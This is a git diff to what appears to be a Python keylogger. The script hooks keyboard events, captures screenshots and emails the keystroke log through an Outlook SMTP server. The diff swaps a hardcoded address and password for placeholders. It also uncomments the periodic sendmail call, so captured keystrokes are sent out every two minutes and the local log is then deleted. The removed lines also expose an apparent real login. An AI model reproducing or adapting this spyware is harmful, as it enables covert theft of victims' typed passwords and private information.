@@ -13,9 +13,9 @@ def sendmail(save):
 	debig = server.starttls()
 	print verify1
 	print debig
-	server.login("rohanhacker@outlook.in", "r0ckstarS")
+	server.login("yourmail@outlook.in", "passwd")
 	msg = "\n"+save
-	server.sendmail("rohanhacker@outlook.in", "rohanhacker@outlook.in", msg)
+	server.sendmail("yourmail@outlook.in", "mail@outlook.in", msg)
 def screenshot():
 	global i
 	global j
@@ -44,7 +44,7 @@ def OnKeyboardEvent(event):
 			global j2
 			if n.minute % 2 == 0 and j2!= n.minute:
 				j2 = n.minute
-#				sendmail(save)
+				sendmail(save)
 				os.remove(file_log)
 			k=chr(event.Ascii)
 			if event.Ascii==13:
